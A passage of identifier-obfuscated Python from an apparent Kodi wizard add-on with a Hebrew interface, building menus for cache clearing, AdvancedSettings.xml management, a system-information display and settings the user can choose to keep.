		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO00OO0OO0O00OO00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2912
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2913
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOO00O00OO0OOOO .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2914
	if OOOOO00O00OO0OOOO =='true':#line:2915
		addFile ('--- Include All Video Addons: %s'%O0OOOOO000OOO00OO .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include Bob: %s'%O0O0OOO0OO0OOOOO0 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Phoenix: %s'%OOOOOOOOOO00O0O00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Include Specto: %s'%OO0O0O0O000OOOO00 .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Include Exodus: %s'%O0OO00OO0O0O0OOOO .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2920
		addFile ('--- Include Salts: %s'%OO0OOO000000000OO .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2921
		addFile ('--- Include Salts HD Lite: %s'%OOO0O0O0OO00OOOOO .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		addFile ('--- Include One Channel: %s'%O0O0O00O0OO00O00O .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2923
		addFile ('--- Include Genesis: %s'%O0OO0O0OO0OOOO00O .replace ('true',OO0O0OOOO0OOOO0OO ).replace ('false',O0O0OOOOOO0OOO000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2924
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2925
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2926
	setView ('files','viewType')#line:2927
def advancedWindow (url =None ):#line:2929
	if not ADVANCEDFILE =='http://':#line:2930
		if url ==None :#line:2931
			OO0000O00OOO0O0OO =wiz .workingURL (ADVANCEDFILE )#line:2932
			OOO0OO0OOO000OO00 =uservar .ADVANCEDFILE #line:2933
		else :#line:2934
			OO0000O00OOO0O0OO =wiz .workingURL (url )#line:2935
			OOO0OO0OOO000OO00 =url #line:2936
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2937
		if os .path .exists (ADVANCED ):#line:2938
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2939
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2940
		if OO0000O00OOO0O0OO ==True :#line:2941
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2942
			OO0O0OO000000OOO0 =wiz .openURL (OOO0OO0OOO000OO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2943
			OO0OO0000OO0O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OO000000OOO0 )#line:2944
			if len (OO0OO0000OO0O000O )>0 :#line:2945
				for O000O0000OO000O00 ,O000O0OOOOO0000O0 ,url ,O0OOO000OO0OOO00O ,O00O0OOO00OO0OOO0 ,OOO0O00OOO000OOO0 in OO0OO0000OO0O000O :#line:2946
					if O000O0OOOOO0000O0 .lower ()=="yes":#line:2947
						addDir ("[B]%s[/B]"%O000O0000OO000O00 ,'advancedsetting',url ,description =OOO0O00OOO000OOO0 ,icon =O0OOO000OO0OOO00O ,fanart =O00O0OOO00OO0OOO0 ,themeit =THEME3 )#line:2948
					else :#line:2949
						addFile (O000O0000OO000O00 ,'writeadvanced',O000O0000OO000O00 ,url ,description =OOO0O00OOO000OOO0 ,icon =O0OOO000OO0OOO00O ,fanart =O00O0OOO00OO0OOO0 ,themeit =THEME2 )#line:2950
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2951
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0000O00OOO0O0OO )#line:2952
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2953
def writeAdvanced (OOOOOOOO00OO00OOO ,O0O00OOOOOOO000OO ):#line:2955
	OOO000O000O0OO000 =wiz .workingURL (O0O00OOOOOOO000OO )#line:2956
	if OOO000O000O0OO000 ==True :#line:2957
		if os .path .exists (ADVANCED ):OO000OO0OO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOOOOO00OO00OOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2958
		else :OO000OO0OO0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOOOOO00OO00OOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2959
		if OO000OO0OO0O0OOOO ==1 :#line:2961
			OO0O0O0OO0OOOO000 =wiz .openURL (O0O00OOOOOOO000OO )#line:2962
			OOO000OOOOOO0O000 =open (ADVANCED ,'w');#line:2963
			OOO000OOOOOO0O000 .write (OO0O0O0OO0OOOO000 )#line:2964
			OOO000OOOOOO0O000 .close ()#line:2965
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2966
			wiz .killxbmc (True )#line:2967
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2968
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO000O000O0OO000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2969
def viewAdvanced ():#line:2971
	OOOOO0O000O0OOO0O =open (ADVANCED )#line:2972
	OOO00OOOOO0O00OOO =OOOOO0O000O0OOO0O .read ().replace ('\t','    ')#line:2973
	wiz .TextBox (ADDONTITLE ,OOO00OOOOO0O00OOO )#line:2974
	OOOOO0O000O0OOO0O .close ()#line:2975
def removeAdvanced ():#line:2977
	if os .path .exists (ADVANCED ):#line:2978
		wiz .removeFile (ADVANCED )#line:2979
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2980
def showAutoAdvanced ():#line:2982
	notify .autoConfig ()#line:2983
def getIP ():#line:2985
	O00OO00OOO0OO0O00 ='http://whatismyipaddress.com/'#line:2986
	if not wiz .workingURL (O00OO00OOO0OO0O00 ):return 'Unknown','Unknown','Unknown'#line:2987
	OOOO0O0O00OO0000O =wiz .openURL (O00OO00OOO0OO0O00 ).replace ('\n','').replace ('\r','')#line:2988
	if not 'Access Denied'in OOOO0O0O00OO0000O :#line:2989
		OO0OOO0O0O00O00OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO0O0O00OO0000O )#line:2990
		O0OO0O00O00O0000O =OO0OOO0O0O00O00OO [0 ]if (len (OO0OOO0O0O00O00OO )>0 )else 'Unknown'#line:2991
		OO0OOOO0OO0OO0O00 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO0O0O00OO0000O )#line:2992
		O0OO0OOOO00O00OO0 =OO0OOOO0OO0OO0O00 [0 ]if (len (OO0OOOO0OO0OO0O00 )>0 )else 'Unknown'#line:2993
		O00O00OOOOOO0000O =OO0OOOO0OO0OO0O00 [1 ]+', '+OO0OOOO0OO0OO0O00 [2 ]+', '+OO0OOOO0OO0OO0O00 [3 ]if (len (OO0OOOO0OO0OO0O00 )>2 )else 'Unknown'#line:2994
		return O0OO0O00O00O0000O ,O0OO0OOOO00O00OO0 ,O00O00OOOOOO0000O #line:2995
	else :return 'Unknown','Unknown','Unknown'#line:2996
def systemInfo ():#line:2998
	O0OOO0OO000OO00OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3012
	OO0000000O0O00OO0 =[];O00OO0OO000OOOOOO =0 #line:3013
	for OOO00OOOOOOOO0000 in O0OOO0OO000OO00OO :#line:3014
		OO0OOOOO0OOO0000O =wiz .getInfo (OOO00OOOOOOOO0000 )#line:3015
		OO0O0OOO0OO0OOOO0 =0 #line:3016
		while OO0OOOOO0OOO0000O =="Busy"and OO0O0OOO0OO0OOOO0 <10 :#line:3017
			OO0OOOOO0OOO0000O =wiz .getInfo (OOO00OOOOOOOO0000 );OO0O0OOO0OO0OOOO0 +=1 ;wiz .log ("%s sleep %s"%(OOO00OOOOOOOO0000 ,str (OO0O0OOO0OO0OOOO0 )));xbmc .sleep (1000 )#line:3018
		OO0000000O0O00OO0 .append (OO0OOOOO0OOO0000O )#line:3019
		O00OO0OO000OOOOOO +=1 #line:3020
	O0O0OOO0000O00OOO =OO0000000O0O00OO0 [8 ]if 'Una'in OO0000000O0O00OO0 [8 ]else wiz .convertSize (int (float (OO0000000O0O00OO0 [8 ][:-8 ]))*1024 *1024 )#line:3021
	O0000OO0O00O00OO0 =OO0000000O0O00OO0 [9 ]if 'Una'in OO0000000O0O00OO0 [9 ]else wiz .convertSize (int (float (OO0000000O0O00OO0 [9 ][:-8 ]))*1024 *1024 )#line:3022
	O0OO00O000O0O00O0 =OO0000000O0O00OO0 [10 ]if 'Una'in OO0000000O0O00OO0 [10 ]else wiz .convertSize (int (float (OO0000000O0O00OO0 [10 ][:-8 ]))*1024 *1024 )#line:3023
	O0000O0O000000OOO =wiz .convertSize (int (float (OO0000000O0O00OO0 [11 ][:-2 ]))*1024 *1024 )#line:3024
	OOOOO0OOOOOO0OO00 =wiz .convertSize (int (float (OO0000000O0O00OO0 [12 ][:-2 ]))*1024 *1024 )#line:3025
	O00O00000OOO0000O =wiz .convertSize (int (float (OO0000000O0O00OO0 [13 ][:-2 ]))*1024 *1024 )#line:3026
	OO00O000000000OOO ,O0O0O0O000O0OOO0O ,OOOOO0OO0O0O00OOO =getIP ()#line:3027
	OOOO000O0OOO00OOO =[];OO0O0000OOO0O0000 =[];O00O00OOOO00000O0 =[];OO000000OOO0OOOO0 =[];OO0O00O0OO000O00O =[];OO0O0OO00OO0O0OOO =[];O0O0O0OOOOO0O00OO =[]#line:3029
	OOO0OOO0OO0000000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3031
	for OO000O00OO0OO0000 in sorted (OOO0OOO0OO0000000 ,key =lambda O0O0000OOOO000000 :O0O0000OOOO000000 ):#line:3032
		O0O00OOO000O0O000 =os .path .split (OO000O00OO0OO0000 [:-1 ])[1 ]#line:3033
		if O0O00OOO000O0O000 =='packages':continue #line:3034
		O0O0OOO00000O0000 =os .path .join (OO000O00OO0OO0000 ,'addon.xml')#line:3035
		if os .path .exists (O0O0OOO00000O0000 ):#line:3036
			O0OO0000OO0O0OO00 =open (O0O0OOO00000O0000 )#line:3037
			OOOOO0OOO00O0OO00 =O0OO0000OO0O0OO00 .read ()#line:3038
			OOO0OOO00O0000OOO =re .compile ("<provides>(.+?)</provides>").findall (OOOOO0OOO00O0OO00 )#line:3039
			if len (OOO0OOO00O0000OOO )==0 :#line:3040
				if O0O00OOO000O0O000 .startswith ('skin'):O0O0O0OOOOO0O00OO .append (O0O00OOO000O0O000 )#line:3041
				if O0O00OOO000O0O000 .startswith ('repo'):OO0O00O0OO000O00O .append (O0O00OOO000O0O000 )#line:3042
				else :OO0O0OO00OO0O0OOO .append (O0O00OOO000O0O000 )#line:3043
			elif not (OOO0OOO00O0000OOO [0 ]).find ('executable')==-1 :OO000000OOO0OOOO0 .append (O0O00OOO000O0O000 )#line:3044
			elif not (OOO0OOO00O0000OOO [0 ]).find ('video')==-1 :O00O00OOOO00000O0 .append (O0O00OOO000O0O000 )#line:3045
			elif not (OOO0OOO00O0000OOO [0 ]).find ('audio')==-1 :OO0O0000OOO0O0000 .append (O0O00OOO000O0O000 )#line:3046
			elif not (OOO0OOO00O0000OOO [0 ]).find ('image')==-1 :OOOO000O0OOO00OOO .append (O0O00OOO000O0O000 )#line:3047
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3050
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3051
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3052
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3053
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3054
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO0000O00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0O00O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00O000O0O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0O000000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OOOOOO0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O00000OOO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O000000000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O000O0OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OO0O0O00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000O0O00OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	OO00OO00OO0OOOOO0 =len (OOOO000O0OOO00OOO )+len (OO0O0000OOO0O0000 )+len (O00O00OOOO00000O0 )+len (OO000000OOO0OOOO0 )+len (OO0O0OO00OO0O0OOO )+len (O0O0O0OOOOO0O00OO )+len (OO0O00O0OO000O00O )#line:3077
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00OO00OO0OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00OOOO00000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000000OOO0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3080
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0000OOO0O0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3081
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOO000O0OOO00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3082
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O00O0OO000O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3083
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0OOOOO0O00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3084
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OO00OO0O0OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3085
def Menu ():#line:3086
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3087
def saveMenu ():#line:3089
	OOOO0OO0O00000OO0 ='[COLOR yellow]מופעל[/COLOR]';O0OOO0OO0O00O00O0 ='[COLOR blue]מבוטל[/COLOR]'#line:3091
	OOO00O0O0OOO000OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3092
	O0O0OO000OOOO0O0O ='true'if KEEPMOVIELIST =='true'else 'false'#line:3093
	O0O000OOO00OOOOOO ='true'if KEEPINFO =='true'else 'false'#line:3094
	OO0O0O0O0OO0O000O ='true'if KEEPSOUND =='true'else 'false'#line:3096
	OOO00O0O0O00O0O0O ='true'if KEEPVIEW =='true'else 'false'#line:3097
	OOOOO0OOO0OO00000 ='true'if KEEPSKIN =='true'else 'false'#line:3098
	O000OO0O0OO00OO00 ='true'if KEEPSKIN2 =='true'else 'false'#line:3099
	OO00OOO00OOOO0OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3100
	O0OO0O0O0000OO000 ='true'if KEEPADDONS =='true'else 'false'#line:3101
	OOO0OOOOO000OO0O0 ='true'if KEEPPVR =='true'else 'false'#line:3102
	O0OOOO00O0O0O0000 ='true'if KEEPTVLIST =='true'else 'false'#line:3103
	O00O0000OO00000O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3104
	O0OOO0OOO0O0000O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3105
	OO00OOOO0000O0O00 ='true'if KEEPHUBTV =='true'else 'false'#line:3106
	O0OO0000OO00O0OO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:3107
	OO00O00000000O00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3108
	O0000000OOO0O0OO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3109
	O000O00O0O0O00O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3110
	OO00O000OO0O00000 ='true'if KEEPHUBMENU =='true'else 'false'#line:3111
	OO0OOO00OOOOOOO00 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3112
	O0OOO000O0OO0O000 ='true'if KEEPTRAKT =='true'else 'false'#line:3113
	OO00O0O0O00O0OO00 ='true'if KEEPREAL =='true'else 'false'#line:3114
	OOOO00O0O000OO0O0 ='true'if KEEPRD2 =='true'else 'false'#line:3115
	O0O000OOOOO0OO000 ='true'if KEEPTORNET =='true'else 'true'#line:3116
	O00O0000OOO0OO00O ='true'if KEEPLOGIN =='true'else 'false'#line:3117
	O000O000OOO0000O0 ='true'if KEEPSOURCES =='true'else 'false'#line:3118
	O000OOO00OOO0000O ='true'if KEEPADVANCED =='true'else 'false'#line:3119
	OOO00O00O0O0OOO00 ='true'if KEEPPROFILES =='true'else 'false'#line:3120
	OO00000O0OO00O000 ='true'if KEEPFAVS =='true'else 'false'#line:3121
	OOO0OO00O0000O00O ='true'if KEEPREPOS =='true'else 'false'#line:3122
	O0O00O0000OOOO0OO ='true'if KEEPSUPER =='true'else 'false'#line:3123
	O0O00O0000000OO00 ='true'if KEEPWHITELIST =='true'else 'false'#line:3124
	O0O0OOO00O0O0OOOO ='true'if KEEPWEATHER =='true'else 'false'#line:3125
	OO0OOOOOOOOO00OO0 ='true'if KEEPVICTORY =='true'else 'false'#line:3126
	OOO0O000OO0O000O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3127
	if O0O00O0000000OO00 =='true':#line:3129
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3130
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3131
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3132
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3133
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון RD:  '%OO00O0O0O00O0OO00 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טראקט:  '%O0OOO000O0OO0O000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת מועדפים:  '%OO00000O0OO00O000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOO0OOOOO000OO0O0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OO0OOOOOOOOO00OO0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת חשבון טלמדיה:  '%OOO0O000OO0O000O0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OOOO00O0O0O0000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח סרטים:  '%O00O0000OO00000O0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת אריח סדרות:  '%O0OOO0OOO0O0000O0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת אריח טלויזיה:  '%OO00OOOO0000O0O00 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OO0000OO00O0OO0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת אריח ספורט:  '%OO00O00000000O00O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת אריח ילדים:  '%O0000000OOO0O0OO0 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3151
	addFile ('%s שמירת אריח מוסיקה:  '%O000O00O0O0O00O0O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO00O000OO0O00000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOO0OOO0OO00000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3154
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0O0OOO00O0O0OOOO .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO0O0O0000OO000 .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O0O000OOO00OOOOOO .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3162
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0O0OO000OOOO0O0O .replace ('true',OOOO0OO0O00000OO0 ).replace ('false',O0OOO0OO0O00O00O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3165
